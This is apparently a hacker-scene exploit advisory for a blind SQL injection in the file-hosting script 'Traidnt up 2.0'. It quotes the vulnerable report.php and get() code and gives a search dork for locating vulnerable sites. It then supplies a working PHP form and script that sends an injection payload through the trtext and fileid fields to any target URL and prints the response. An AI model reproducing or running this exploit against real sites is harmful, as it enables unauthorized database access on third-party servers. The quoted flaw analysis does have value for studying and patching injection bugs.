Exploit : Traidnt up 2.0 (report.php trtext) Blind SQL Injection 
Author  : Cold z3ro http://www.hackteach.org | http://www.s3curi7y.com
varibles: fileid,trtext
usage   : Exploit it manually 
dork 	: &#039;powered by traidnt up 2.0&#039;


Bug :
in report.php
	include("includes/function.php");
     $trtext = get($_POST[trtext]);
     $code =  md5(get($_POST[code]));
     $fileid = get($_POST[fileid]);
     $cp = $_SESSION[&#039;key&#039;];

in includes/function.php checking function get
 	function get ($variable){

  		$variable = trim($variable);
  		$variable = strip_tags($variable); <=  strip_tags not enough to stop hackers [Ya Turky Alwad3any]
  		//$variable = mysql_real_escape_string($variable); <= mysql_real_escape_string they commant it morons 
  		return($variable);
 	}
	
in report.php again

 	if($errors != &#039;&#039;){
      $traidnt->assign(message,charset($errors."<b><a href=&#039;$site[site_link]/view.php?file=$fileid&#039;>انتظر سوف يتم تحويلك للملف مرة أخري</a></b>"."<META HTTP-EQUIV=&#039;Refresh&#039; CONTENT=&#039;2; url=$site[site_link]/view.php?file=$fileid&#039;>"));
      $traidnt->display("message.tpl");
 	}else{
        $ip = getenv(&#039;REMOTE_ADDR&#039;);

		$reportquery = $db->query("
INSERT INTO `report` (`report_key` ,`report_why` ,`report_ip` ) VALUES (&#039;$fileid&#039;, &#039;$trtext&#039;, &#039;$ip&#039;);"); 

<= we can inject here trtext and also can inject fileid

        if($reportquery){
  		$traidnt->assign(message,$lang[report]."<META HTTP-EQUIV=&#039;Refresh&#039; CONTENT=&#039;2; url=$site[site_link]/view.php?file=$fileid&#039;>");
-->

----------------------- start of exploit and do it manually -----------------------
<form method="POST">
Target <input type="text" name="h" value="<? if($_POST[&#039;h&#039;]) {echo $_POST[&#039;h&#039;]; }else{echo &#039;http://www.google.com/upload/ lol am joking :D&#039;;} ?>" size="70" /><br />
Exploit <input type="text" name="f" value="<? if($_POST[&#039;f&#039;]) {echo $_POST[&#039;f&#039;]; }else{echo "yumy&#039;+order+by+4";} ?>" size="70" /><br /> <!--exploit here -->
<input type="hidden" name="t" value="Exploit+by+Cold+z3ro" /> <!-- and also can exploit here -->
<input type="hidden" name="c" value="4473e588b35568687564de38ed134d0b" /> <!-- md5(anything you want) no need to change -->
<input type="submit" name="xdc" />
</form>

<?
// manul exploit i have no time to continue coding
if($_POST["xdc"]){
if( !eregi(&#039;http://&#039;, $_POST[h])){
	die(&#039;use "http://" in the link you moron and / at end&#039;);
}else{
     $t = $_POST[t];
     $c = $_POST[c];
     $f = $_POST[f];
     $h = $_POST[h].&#039;report.php&#039;;
$data = array(&#039;trtext&#039; => $t, &#039;code&#039; => $c, &#039;fileid&#039; => $f);
$options = array(&#039;http&#039; => array(&#039;method&#039;  => &#039;POST&#039;,&#039;content&#039; => http_build_query($data)));
$context = stream_context_create($options);
$conlink = file_get_contents($h, false, $context);
//removing the fucking meta, redirects killing me , so decide to replace it 
$result = str_replace ("HTTP-EQUIV=","z3ro",$conlink); 
var_dump($result);
}
}
?>
----------------------- end of exploit -----------------------

